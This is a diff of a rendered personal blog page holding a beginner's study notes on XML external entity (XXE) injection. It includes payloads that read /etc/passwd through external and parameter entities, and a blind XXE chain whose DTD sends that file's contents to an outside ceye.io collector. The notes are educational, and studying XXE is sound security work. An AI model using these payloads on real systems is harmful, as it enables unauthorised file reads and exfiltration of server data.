+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot; ?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ELEMENT note (name)&gt; </span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY fuck &quot;You&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>&amp;fuck;<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>I don&#x2019;t know why that I can&#x2019;t build a xml within external entity successfully. So I wanan put it away in this time.</p>
 <h2 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h2><p>When there is a post , it made up by xml. And the parameter can be control. Mybe there hava a XXE vluntery.</p>
 <p>We can use some simple xml to test it.</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY foo "Testing"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">parameter</span>&gt;</span>&amp;foo;<span class="tag">&lt;/<span class="name">parameter</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>If it return “Testing”. We can use another to get more information.</p>
-<h3 id="Normal-XXE"><a href="#Normal-XXE" class="headerlink" title="Normal XXE"></a>Normal XXE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE test[</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY foo &quot;Testing&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">parameter</span>&gt;</span>&amp;foo;<span class="hljs-tag">&lt;/<span class="hljs-name">parameter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>If it return &#x201C;Testing&#x201D;. We can use another to get more information.</p>
+<h3 id="Normal-XXE"><a href="#Normal-XXE" class="headerlink" title="Normal XXE"></a>Normal XXE</h3><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span>&amp;test;<span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>Parameter entity:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">	%test;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY % test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">	%test;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>If the website return nothing , There is another mean to deal with this problem.</p>
 <p>Use external entity:</p>
 <p>XML:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY test SYSTEM "http://127.0.0.1/shell.dtd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1/shell.dtd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">c</span>&gt;</span>&amp;test;<span class="hljs-tag">&lt;/<span class="hljs-name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>DTD:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY foo SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="Blind-XXE-with-ceye-io"><a href="#Blind-XXE-with-ceye-io" class="headerlink" title="Blind XXE with ceye.io:"></a>Blind XXE with ceye.io:</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;</span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>
-<p>We can create a dtd to get echo result(回显结果).</p>
-<p>XML:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % payload SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % dtd SYSTEM "http://*.*.*.*:8080/xml/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">	%dtd;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>DTD:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all </span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://ip.port.b182oj.ceye.io/?xml1=%payload;&apos;&gt;&quot;</span><br><span class="line">&gt;%all;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY foo SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Blind-XXE-with-ceye-io"><a href="#Blind-XXE-with-ceye-io" class="headerlink" title="Blind XXE with ceye.io:"></a>Blind XXE with ceye.io:</h3><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM &quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>We can create a dtd to get echo result(&#x56DE;&#x663E;&#x7ED3;&#x679C;).</p>
+<p>XML:</p>
+<figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">	&lt;!ENTITY % dtd SYSTEM &quot;http://*.*.*.*:8080/xml/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="hljs-meta">	%dtd;</span></span><br><span class="line"><span class="hljs-meta">	%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD:</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all </span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://ip.port.b182oj.ceye.io/?xml1=%payload;&apos;&gt;&quot;</span><br><span class="line">&gt;%all;</span><br></pre></td></tr></table></figure>
+
 <p>If the XEE is exist, ceye will get a GET request.</p>
 <p>Of course there are many means to get important and private information. But due to my ability, I wanna put it down to learn more important things.</p>
-<h3 id="XML-in-PHP："><a href="#XML-in-PHP：" class="headerlink" title="XML in PHP："></a>XML in PHP：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml=simplexml_load_file(<span class="string">"note.xml"</span>);</span><br><span class="line">print_r($xml);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="XML-in-PHP&#xFF1A;"><a href="#XML-in-PHP&#xFF1A;" class="headerlink" title="XML in PHP&#xFF1A;"></a>XML in PHP&#xFF1A;</h3><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$xml=simplexml_load_file(<span class="hljs-string">&quot;note.xml&quot;</span>);</span><br><span class="line">print_r($xml);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
-<li><a href="http://hu3sky.ooo/2018/06/29/xxe%E5%AD%A6%E4%B9%A0/#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93" target="_blank" rel="noopener">hu3sky’blog(There is a poc about how to probe intranet)</a></li>
-<li><a href="https://www.freebuf.com/articles/web/195899.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">使用本地DTD文件来利用XXE漏洞实现任意结果输出</a></li>
-<li><a href="https://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">浅谈XXE攻击</a></li>
-<li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">XXE漏洞攻防</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0205725.html" target="_blank" rel="noopener">中国电信某省系统Blink XXE</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0203510.html" target="_blank" rel="noopener">搜狐焦点主站Blind XXE利用Cloudeye神器测试</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0203048.html" target="_blank" rel="noopener">利用网易一处XXE盲注演示如何通过cloudeye配合实现文件内容读取</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0189058.html" target="_blank" rel="noopener">汉启科技智能邮件系统一个XXE文件读取引发的血案</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0166751.html" target="_blank" rel="noopener">Xfire文件读取漏洞(…Service?wsdl)</a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0122544.html" target="_blank" rel="noopener">XXE &amp; SQL 方维O2O商业系统SQL注入漏洞+XXE实体注入 </a></li>
-<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0117316.html" target="_blank" rel="noopener">    用友人力资源管理软件全版本XXE漏洞 (XXE FUZZ)</a></li>
+<li><a href="http://hu3sky.ooo/2018/06/29/xxe%E5%AD%A6%E4%B9%A0/#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93" target="_blank" rel="noopener">hu3sky&#x2019;blog(There is a poc about how to probe intranet)</a></li>
+<li><a href="https://www.freebuf.com/articles/web/195899.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">&#x4F7F;&#x7528;&#x672C;&#x5730;DTD&#x6587;&#x4EF6;&#x6765;&#x5229;&#x7528;XXE&#x6F0F;&#x6D1E;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x7ED3;&#x679C;&#x8F93;&#x51FA;</a></li>
+<li><a href="https://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">&#x6D45;&#x8C08;XXE&#x653B;&#x51FB;</a></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">XXE&#x6F0F;&#x6D1E;&#x653B;&#x9632;</a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0205725.html" target="_blank" rel="noopener">&#x4E2D;&#x56FD;&#x7535;&#x4FE1;&#x67D0;&#x7701;&#x7CFB;&#x7EDF;Blink XXE</a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0203510.html" target="_blank" rel="noopener">&#x641C;&#x72D0;&#x7126;&#x70B9;&#x4E3B;&#x7AD9;Blind XXE&#x5229;&#x7528;Cloudeye&#x795E;&#x5668;&#x6D4B;&#x8BD5;</a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0203048.html" target="_blank" rel="noopener">&#x5229;&#x7528;&#x7F51;&#x6613;&#x4E00;&#x5904;XXE&#x76F2;&#x6CE8;&#x6F14;&#x793A;&#x5982;&#x4F55;&#x901A;&#x8FC7;cloudeye&#x914D;&#x5408;&#x5B9E;&#x73B0;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x8BFB;&#x53D6;</a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0189058.html" target="_blank" rel="noopener">&#x6C49;&#x542F;&#x79D1;&#x6280;&#x667A;&#x80FD;&#x90AE;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E00;&#x4E2A;XXE&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x5F15;&#x53D1;&#x7684;&#x8840;&#x6848;</a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2016-0166751.html" target="_blank" rel="noopener">Xfire&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;(&#x2026;Service?wsdl)</a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0122544.html" target="_blank" rel="noopener">XXE &amp; SQL &#x65B9;&#x7EF4;O2O&#x5546;&#x4E1A;&#x7CFB;&#x7EDF;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;+XXE&#x5B9E;&#x4F53;&#x6CE8;&#x5165; </a></li>
+<li><a href="http://www.anquan.us/static/bugs/wooyun-2015-0117316.html" target="_blank" rel="noopener">    &#x7528;&#x53CB;&#x4EBA;&#x529B;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;&#x5168;&#x7248;&#x672C;XXE&#x6F0F;&#x6D1E; (XXE FUZZ)</a></li>
 <li>[From blind XXE to root-level file read access]<a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="noopener">https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/</a></li>
 </ul>
 
+    
     </div>
-
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/XML/">#XML</a></span>
+    
+    </div>
     
     
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/01/01/XPath/">了解Xpath</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/01/01/XSS_02_XSS备忘录/">XSS O2 XSS备忘录</a>
+            
+        </span>
+    </div>
     
-        
-      
+</article>
 
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/XML/" rel="tag"># XML</a>
-            
-          </div>
-        
 
-        
 
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/01/01/XPath/" rel="next" title="了解Xpath">
-                  <i class="fa fa-chevron-left"></i> 了解Xpath
-                </a>
-              
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
+            <div class="column is-hidden-mobile"></div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/01/01/Head First Javascript/" rel="prev" title="Head First Javascript笔记">
-                  Head First Javascript笔记 <i class="fa fa-chevron-right"></i>
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
                 </a>
-              
+                
+                </div>
             </div>
-          </div>
-        
-      </footer>
-    
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
+            
+            
         </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Inhaltsverzeichnis
-        </li>
-        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Übersicht
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-note："><span class="nav-number">1.</span> <span class="nav-text">Simple note：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML"><span class="nav-number">1.1.</span> <span class="nav-text">XML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD"><span class="nav-number">1.2.</span> <span class="nav-text">DTD</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Try"><span class="nav-number">2.</span> <span class="nav-text">Try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DIG"><span class="nav-number">3.</span> <span class="nav-text">DIG</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Normal-XXE"><span class="nav-number">3.1.</span> <span class="nav-text">Normal XXE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-XXE-with-ceye-io"><span class="nav-number">3.2.</span> <span class="nav-text">Blind XXE with ceye.io:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML-in-PHP："><span class="nav-number">3.3.</span> <span class="nav-text">XML in PHP：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
-          </div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Threezh1</p>
-  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">Artikel</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">Kategorien</span>
-        
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">21</span>
-        <span class="site-state-item-name">schlagwörter</span>
-        
-      </div>
-    
-  </nav>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-      </span>
-    
-  </div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
 
 
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
 
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
